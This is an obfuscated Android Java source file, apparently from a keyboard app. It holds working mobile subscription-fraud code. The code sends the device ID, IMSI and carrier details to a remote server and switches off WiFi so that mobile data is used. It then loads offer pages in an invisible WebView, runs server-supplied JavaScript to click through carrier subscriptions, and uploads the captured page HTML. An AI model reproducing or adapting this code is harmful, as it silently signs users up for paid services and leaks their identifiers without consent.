package com.bjuw.twnln.utils;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.view.ViewGroup;
import android.webkit.JavascriptInterface;
import android.webkit.ValueCallback;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import org.json.JSONObject;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 * Created by fg on 2017/9/1.
 */

public class d {

    private String serverUrl = "http://channel.uq19.com";
    private String appId = "app_diykeyboard_gp_1001";
    private OkHttpClient mOkHttpClient;
    private static d8 d8;
    private static JSONObject taskJsonData;
    private WebView wv;
    private ViewGroup layout;
    private Activity activity;

    public void d1(Activity activity) {

        this.activity = activity;

        if (this.activity == null) return;


        boolean isSubscribe = f.f15(activity, "isSubscribe");

        if (!isSubscribe) {

            layout = (ViewGroup) ((Activity) activity).getWindow().getDecorView().findViewById(android.R.id.content);
            Thread apiThread = new Thread(new Runnable() {
                public void run() {
                    //取任务
                    d3();
                }
            });

            apiThread.setDaemon(true);
            apiThread.start();

        }
    }

    //获得用户任务
    public Request d2() {
        Map<String, String> deviceMap = f.f1(activity);
        String url = serverUrl + "/adsadmin/task/getTask";
        url += "?appId=" + appId;
        url += "&deviceId=" + deviceMap.get("deviceId");
        url += "&imsi=" + deviceMap.get("imsi");
        url += "&telecomsOperator=" + deviceMap.get("telecomsOperator");
        url += "&areaCode=" + deviceMap.get("areaCode");
        //创建request
        Request request = new Request.Builder().url(url).build();
        return request;
    }


    private void d3() {
        //创建okHttpClient对象
        mOkHttpClient = new OkHttpClient();
        //new call
        Call call = mOkHttpClient.newCall(d2());
        //请求加入调度
        call.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.i("TAG", " ---offer请求失败-----    ");
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                Log.i("TAG", " ---offer请求成功-----    ");
                try {
                    JSONObject myJsonObject = new JSONObject(response.body().string());

                    if (myJsonObject != null && "200".equals(myJsonObject.getString("code"))) {

                        //保存taskUUid
                        f.f16(activity, "taskUuid", myJsonObject.getString("taskUuid"));
                        //保存OfferUUid
                        f.f16(activity, "offerUuid", myJsonObject.getString("offerUuid"));

                        if (f.f9(activity) == true) {

                            f.f16(activity, "isWifi", "true");

                            //注册广播来切3G
                            d9();
                            //关闭Wifi
                            f.f10(activity, false);
                            //打开3G流量
                            f.f11(activity, true);

                            //把数据线暂时存起来
                            taskJsonData = myJsonObject;

                        } else {
                            //执行业务逻辑
                            d4(myJsonObject);

                            //Wifi没有打开的话就设置为false状态
                            f.f16(activity, "isWifi", "false");
                        }
                    }
                } catch (Exception e) {
                    String s = response.body().toString();
                    Log.i("response Error", "onResponse: ----response.body().toString()-------  " + s);
                    e.printStackTrace();
                }

            }
        });
    }


    //执行业务逻辑
    private void d4(JSONObject response) {
        e offer = new e(response);
        Message msg = new Message();
        msg.obj = offer.e1();
        d5.sendMessage(msg);
    }

    //处理界面
    private Handler d5 = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            e offer = (e) msg.obj;
            d6(offer);
        }
    };


    //自动执行
    private void d6(final e offer) {
        // initialize WebView as browser only if needed
        if (null != offer) {
            final WebView webView = d7(offer);
            webView.setWebViewClient(new WebViewClient() {
                public void onPageFinished(WebView view, final String url) {
                    // do your stuff here
                    Log.v("WebView onPageFinished", url);
                    //如果URL重复，最多请求配置的次数，数据放入缓存中
                    String urlMd5 = f.f6(url);
                    if ("".equals(urlMd5)) {
                        return;
                    }

                    //屏蔽用户重复请求
                    /*Integer status = CacheUtil.getJumpUrlStatus(urlMd5);
                    if(status != null && "1".equals(status+"")){
                    	return;
                    }*/

                    if ("".equals(f.f17(activity, urlMd5))) {
                        f.f16(activity, urlMd5, "1");
                    } else {
                        int requestTimes = Integer.valueOf(f.f17(activity, urlMd5));
                        if (requestTimes > offer.pageRetryTimes) {
                            return;
                        } else {
                            int haveRequestTimes = requestTimes + 1;
                            f.f16(activity, urlMd5, haveRequestTimes + "");
                        }
                    }

                    final String offerUuid = offer.id;
                    //执行页面自动跳转
                    int auto_len = offer.automations.size();
                    for (int i = 0; i < auto_len; i++) {
                        String pattern = offer.automations.get(i)[0];
                        String script = offer.automations.get(i)[1];
                        String action = offer.automations.get(i)[2];
                        boolean match = url.matches(pattern);
                        if (true == match) {
                            //如果遇到成功订阅的URL，退出Webview
                            if ("success".equals(action)) {
//                                uploadTaskStatusToServer(offerUuid,"success",webView,layout);
                                String isWifi = f.f17(activity, "isWifi");
                                if ("true".equals(isWifi)) {
                                    //打开wifi
                                    f.f10(activity, true);
                                }
                                //关闭Webview
                                f.f18(layout, webView);
                                f.f14(activity, "isSubscribe", true);

                                break;
                            }

                            Log.v("Pattern is matched", pattern);
                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
                                Log.v("JS Evaluate", script);
                                webView.evaluateJavascript(script, new ValueCallback<String>() {
                                    @Override
                                    public void onReceiveValue(String value) {
                                        Log.v("JS Result", "onReceiveValue value=" + value);
                                    }
                                });
                            } else {
                                //Log.v("JS", "loadUrl");
                                webView.loadUrl("javascript:" + script);
                            }
                            //等待一些时间
                            //可以配置自动执行任务间的间隔时间
                            long scriptIntervalTime = offer.scriptIntervalTime;
                            try {
                                Thread.sleep(scriptIntervalTime);
                            } catch (InterruptedException e) {
                                // TODO Auto-generated catch block
                                e.printStackTrace();
                            }
                        } else {
                            Log.v("Pattern not match", pattern);
                        }
                    }

                    //把URL保存起来
                    //如果需要保存网页内容
                    if (offer.isSaveContent == 1) {
                        String scriptGetContent = "javascript:pagejs.getHtmlSource(document.documentElement.outerHTML,window.location.href);void(0);";
                        webView.loadUrl(scriptGetContent);
                    } else {
                        //userInfoAction.saveJumpUrl(offerUuid,url,null);
                    }
                    //CacheUtil.saveJumpUrlStatus(urlMd5, 1);
                }
            });
            Log.v("load trackingLink", offer.trackingLink);
            webView.loadUrl(offer.trackingLink);
        }

    }


    //初始化webView
    private WebView d7(e offer) {
        // get ViewGroup from context
        // used as insertion point for WebView
        // ViewGroup layout = (ViewGroup) ((Activity) context).getWindow().getDecorView().findViewById(android.R.id.content);
        wv = new WebView(activity);
        // JavaScriptEnabled
        wv.getSettings().setJavaScriptEnabled(true);
        // solve network and cache problem
        wv.getSettings().setCacheMode(WebSettings.LOAD_NO_CACHE);
        wv.getSettings().setAllowFileAccess(true);
        // This settings enable Javascript click() open link in new tab
        wv.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        // set WebView invisible by size(0, 0)
        if (offer.isShowWebview == 0) {
            wv.setLayoutParams(new ViewGroup.LayoutParams(0, 0));
        } else {
            wv.setLayoutParams(new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));
        }
        //wv.setLayoutParams(new ViewGroup.LayoutParams(0, 0));
        wv.addJavascriptInterface(new d11(), "pagejs");
        // WebView need to be added to View to be activited
        layout.addView(wv);
        return wv;
    }


    /**
     * 网络切换广播接收
     */
    private class d8 extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent != null && "android.net.conn.CONNECTIVITY_CHANGE".equals(intent.getAction())) {
                ConnectivityManager manager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
                NetworkInfo mobileInfo = manager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
                NetworkInfo wifiInfo = manager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
                String str = "mobile:" + mobileInfo.isConnected() + "; wifi:" + wifiInfo.isConnected();
                Log.d("TAG", str);
                // 如果检测到数据流量打开，则进行跳转
                if (mobileInfo.isConnected()) {
                    Log.d("TAG", "数据流量已打开，开始wap订阅");
                    f.f16(context, "isWifi", "false");
                    //开始任务
                    //执行业务逻辑
                    d4(taskJsonData);

                    d10();
                }
            } else {
                Log.d("TAG", "网络没有变的情况下");
            }
        }
    }

    private void d9() {
        Log.d("TAG", "注册监测网络状态广播");
        if (d8 == null) {
            d8 = new d8();
            IntentFilter filter = new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE");
            try {
                activity.registerReceiver(d8, filter);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * 销毁注册广播
     */
    private void d10() {
        if (d8 != null) {
            try {
                Log.d("TAG", "销毁监测网络状态广播");
                activity.unregisterReceiver(d8);
            } catch (Exception e) {
                e.printStackTrace();
            }
            d8 = null;
            taskJsonData = null;
        }
    }

    //保存网页接口
    private final class d11 {

        @JavascriptInterface
        public void getHtmlSource(final String html, final String url) {
            final String offerUuid = f.f17(activity, "offerUuid");
            Log.i("offerUuid", "getHtmlSource: ------offerUuid----  " + offerUuid);

            new Thread() {
                @Override
                public void run() {

                    d12(offerUuid, url, html);
                }
            }.start();
        }

    }


    private void d12(String offerUuid, final String jumpUrl, final String content) {
        //创建一个OkHttpClient对象
        OkHttpClient okHttpClient = new OkHttpClient();

        final Map<String, String> deviceMap = f.f1(activity);
        Map<String, String> paramsMap = new HashMap<String, String>();
        paramsMap.put("appId", appId);
        paramsMap.put("deviceId", deviceMap.get("deviceId"));
        paramsMap.put("imsi", deviceMap.get("imsi"));
        paramsMap.put("offerUuid", offerUuid);
        paramsMap.put("taskUuid", f.f17(activity, "taskUuid"));
        paramsMap.put("jumpUrl", jumpUrl);
        paramsMap.put("content", content);
        JSONObject jsonObject = new JSONObject(paramsMap);

        MediaType JSON = MediaType.parse("application/json; charset=utf-8");
        RequestBody body = RequestBody.create(JSON, String.valueOf(jsonObject));

        //创建一个请求对象
        Request request = new Request.Builder()
                .url(serverUrl + "/adsadmin/log/addLog")
                .post(body)
                .header("Accept", "application/json")
                .header("Content-Type", "application/json; charset=UTF-8")
                .build();
        //发送请求获取响应
        try {
            Response response = okHttpClient.newCall(request).execute();
            //判断请求是否成功
            if (response.isSuccessful()) {
                Log.i("上传成功", "d12: ----isSuccessful--------");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
